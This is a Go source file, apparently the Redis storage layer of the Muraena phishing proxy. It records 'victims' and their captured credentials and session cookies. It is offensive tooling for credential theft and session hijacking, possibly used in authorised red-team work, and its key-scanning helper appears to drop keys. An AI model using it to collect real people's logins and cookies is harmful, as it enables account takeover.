package db

import (
	"fmt"

	"github.com/gomodule/redigo/redis"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

// Victim: a browser that interacts with Muraena
// KEY scheme:
// victim:Victim.ID
type Victim struct {
	ID                  string `redis:"id"`
	IP                  string `redis:"ip"`
	UA                  string `redis:"ua"`
	FirstSeen           string `redis:"fseen"`
	LastSeen            string `redis:"lseen"`
	RequestCount        int    `redis:"reqCount"`
	CredsCount          int    `redis:"creds_count"`
	CookieJar           string `redis:"cookiejar_id"`
	SessionInstrumented bool   `redis:"session_instrumented"`

	Cookies     []VictimCookie     `redis:"-"`
	Credentials []VictimCredential `redis:"-"`
}

// VictimCredential: a set of credentials associated to a Victim
// KEY scheme:
// victim:Victim.ID:creds:<COUNT>
type VictimCredential struct {
	Key   string `redis:"key"`
	Value string `redis:"val"`
	Time  string `redis:"time"`
}

// VictimCookie: a set of HTTP cookies associated to the Victim's active session
// KEY scheme:
// victim:Victim.ID:cookiejar:VictimCookie.Name
type VictimCookie struct {
	Name     string `redis:"name" json:"name"`
	Value    string `redis:"value" json:"value"`
	Domain   string `redis:"domain" json:"domain"`
	Expires  string `redis:"expires" json:"expirationDate"`
	Path     string `redis:"path" json:"path"`
	HTTPOnly bool   `redis:"httpOnly" json:"httpOnly"`
	Secure   bool   `redis:"secure" json:"secure"`
	SameSite string `redis:"sameSite" json:"sameSite"`
	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
}

// Store sets the Victim struct in the hash stored at key victim:Victim.ID
// This action overwrites any specified field already existing in the hash.
// If key does not exist, a new key holding a hash is created.
// Additionally, this function inserts the Victim.ID in the list: victims.
//
// Redis commands:
// HMSET victim:Victim.ID Victim
// RPUSH victims Victim.ID
func (v *Victim) Store() error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", v.ID)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(v)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim not saved.", err)
		return err
	}

	// push the Victim.ID
	_, err := rc.Do("RPUSH", "victims", v.ID)
	if err != nil {
		return err
	}

	return nil
}

// Store sets the VictimCredential struct in the hash stored at key victim:Victim.ID:creds:Victim.CredsCount
// This action overwrites any specified field already existing in the hash.
// If key does not exist, a new key holding a hash is created.
//
// Redis commands:
// HMSET victim:Victim.ID:creds:Victim.CredsCount VictimCredential
func (vc *VictimCredential) Store(victimID string) error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	v, err := GetVictim(victimID)
	if err != nil {
		return err
	}

	// store the credentials
	key := fmt.Sprintf("victim:%s:creds:%d", victimID, v.CredsCount)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vc)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	// increase the credentials count
	// TODO implement this with REDIS HINCRBY
	key = fmt.Sprintf("victim:%s", victimID)
	increment := make(map[string]string)
	increment["creds_count"] = fmt.Sprintf("%d", v.CredsCount+1)

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(increment)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	return nil
}

// Store sets the VictimCookie struct in the hash stored at key victim:Victim.ID:cookiejar:VictimCookie.Name
// This action overwrites any specified field already existing in the hash.
// If key does not exist, a new key holding a hash is created.
// Additionally, this function inserts the VictimCookie.Name in the list: victim:Victim.ID:cookiejar_entries.
//
// Redis commands:
// HMSET victim:Victim.ID:cookiejar:VictimCookie.Name VictimCookie
// RPUSH victim:Victim.ID:cookiejar_entries VictimCookie.Name
func (vc *VictimCookie) Store(victimID string) error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s:cookiejar:%s", victimID, vc.Name)

	jarEntry, err := redis.Values(rc.Do("HGETALL", key))
	if err != nil {
		return err
	}

	var vCookie VictimCookie
	err = redis.ScanStruct(jarEntry, &vCookie)
	if err != nil {
		return err
	}

	// check if the cookie is already stored.
	// if it is, just updates its values but do not add an entry to the cookie names list
	// TODO: Double check this behaviour. Cookie name is not enough to identify uniquely a cookie.
	//  We need to map it to the origin instead (name, path, domain)
	if vCookie.Name == "" {
		// store the cookie name only if not present already
		_, err = rc.Do("RPUSH", fmt.Sprintf("victim:%s:cookiejar_entries", victimID), vc.Name)
		if err != nil {
			return err
		}
	}

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vc)...); err != nil {
		return err
	}

	return nil
}

// GetVictim returns a Victim
//
// Redis commands:
// HGETALL victim:Victim.ID
func GetVictim(victimID string) (*Victim, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	var v Victim
	vid := fmt.Sprintf("victim:%s", victimID)
	value, err := redis.Values(rc.Do("HGETALL", vid))
	if err != nil {
		return nil, err
	}

	err = redis.ScanStruct(value, &v)
	if err != nil {
		return nil, err
	}

	// TODO: Review the autopopulate below, it might be a bullshit because it stress out the Redis.

	// Populate Credentials
	err = v.GetCredentials()
	if err != nil {
		return nil, err
	}

	// Populate Cookies
	err = v.GetVictimCookiejar()
	if err != nil {
		return nil, err
	}

	return &v, nil
}

// GetCredentials retrieves the credentials of a Victims stored in the database.
// This function populates the Victim.Credentials property.
//
// Redis commands:
// HGETALL victim:Victim.ID:creds:...
//
// FIXME: Consider to rename this method to a more semantic one
func (v *Victim) GetCredentials() error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	v.Credentials = []VictimCredential{}
	//cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:creds:*", v.ID)))
	cKeys, err := ScanAll(fmt.Sprintf("victim:%s:creds:*", v.ID))
	if err != nil {
		return err
	}

	for _, k := range cKeys {
		creds, err := redis.Values(rc.Do("HGETALL", k))
		if err != nil {
			log.Error("%v", err)
			continue
		}

		var vc VictimCredential
		err = redis.ScanStruct(creds, &vc)
		if err != nil {
			log.Error("%v", err)
			continue
		}

		v.Credentials = append(v.Credentials, vc)
	}

	return nil
}

// GetVictimCookiejar retrieves the Cookie jar of a Victims stored in the database.
// This function populates the Victim.Cookies property.
//
// Redis commands:
// HGETALL victim:Victim.ID:creds:...
//
// FIXME: Consider to rename this method to a more semantic one
func (v *Victim) GetVictimCookiejar() error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	v.Cookies = []VictimCookie{}

	//	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:cookiejar:*", v.ID)))
	cKeys, err := ScanAll(fmt.Sprintf("victim:%s:cookiejar:*", v.ID))
	if err != nil {
		return err
	}

	for _, k := range cKeys {
		cookies, err := redis.Values(rc.Do("HGETALL", k))
		if err != nil {
			log.Error("%v", err)
			continue
		}

		var vc VictimCookie
		err = redis.ScanStruct(cookies, &vc)
		if err != nil {
			log.Error("%v", err)
			continue
		}

		v.Cookies = append(v.Cookies, vc)
	}

	return nil
}

// GetAllVictims fetches all the stored Victim(s) in the database
//
// Redis commands:
// LRANGE victims 0 -1
func GetAllVictims() ([]Victim, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	values, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
	if err != nil {
		return nil, err
	}

	var victims []Victim
	for _, vID := range values {
		v, err := GetVictim(vID)
		if err != nil {
			log.Error("error fetching victim %s: %s", vID, err)
			continue
		}

		victims = append(victims, *v)
	}

	return victims, nil
}

// SetSessionAsInstrumented updates the Victim hash by setting the Victim.SessionInstrumented value to true.
//
// Redis commands:
// HSET victim:Victim.ID session_istrumented true
//
// FIXME: Consider to use the Store function for this: update the Victim struct and then Victim.Store.
func SetSessionAsInstrumented(victimID string) error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", victimID)
	if _, err := rc.Do("HSET", key, "session_instrumented", true); err != nil {
		log.Error("error doing redis HSET: %s. session_instrumented field not saved.", err)
		return err
	}

	return nil
}

// ScanAll is a wrapper for SCAN command to return all keys matching a specific pattern.
//
// Redis commands:
// SCAN i MATCH pattern
func ScanAll(pattern string) (keys []string, err error) {

	c := session.RedisPool.Get()
	defer c.Close()

	keys = []string{}
	i := 0
	for {
		if arr, err := redis.Values(c.Do("SCAN", i, "match", pattern)); err != nil {
			return nil, err
		} else {
			i, _ = redis.Int(arr[0], nil)
			if v, _ := redis.Strings(arr[1], nil); len(v) > 0 {
				keys = append(keys, v[0])
			}
		}

		// back to iterator == 0, exit
		if i == 0 {
			break
		}
	}

	return
}
